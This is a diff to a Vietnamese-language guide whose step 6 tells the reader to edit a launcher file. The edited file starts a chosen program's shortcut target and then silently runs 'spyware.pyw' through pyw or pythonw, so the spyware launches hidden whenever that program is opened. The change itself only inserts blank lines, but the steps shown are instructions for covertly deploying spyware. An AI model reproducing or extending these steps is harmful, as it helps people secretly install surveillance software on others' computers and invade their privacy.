@@ -37,8 +37,11 @@
 > *Bước 6*:
 >> Chỉnh sửa file theo mẫu sau:
 >>> start "" "<phần_target_đã_copy_ở_bước_3>"
+>>> 
 >>> cd <thư_mục_chứa_file_spyware.pyw>
+>>> 
 >>> pyw spyware.pyw
+>>> 
 >>> **Lưu ý:** Dòng lệnh thứ 3 có thể là "pythonw spyware.pyw"
 >>
 >> ![Bước 6](https://i.imgur.com/MWT9f8C.png)
